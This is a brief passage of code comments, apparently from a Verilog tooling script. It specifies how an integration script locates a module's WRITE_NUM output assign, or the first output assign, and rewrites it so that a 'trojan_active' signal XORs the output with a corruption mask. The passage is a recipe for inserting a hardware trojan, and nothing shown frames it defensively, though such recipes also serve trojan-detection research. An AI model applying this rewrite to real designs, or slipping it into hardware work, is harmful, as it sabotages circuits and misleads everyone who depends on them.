...
//
// IMPORTANT: WRITE_NUM may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If WRITE_NUM is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for WRITE_NUM (or first output assign):
//     assign WRITE_NUM = <expr>;
//   Replace with:
//     assign WRITE_NUM = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
